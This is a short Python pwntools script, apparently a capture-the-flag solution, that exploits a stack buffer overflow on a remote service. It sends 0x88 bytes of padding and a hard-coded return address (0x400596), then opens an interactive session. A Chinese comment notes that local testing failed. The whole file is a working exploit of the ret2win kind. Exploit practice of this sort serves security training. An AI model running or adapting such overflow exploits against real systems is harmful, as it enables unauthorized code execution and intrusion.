from pwn import *

context.log_level = 'DEBUG'

# 本地测试不行，不知道为啥
# p = process('../file/291721f42a044f50a2aead748d539df0')
p = remote('61.147.171.105', '59319')
input('continue?')

p.recvuntil(b'World\n')

payload = b'a' * 0x88 + p64(0x400596)
p.sendline(payload)

p.interactive()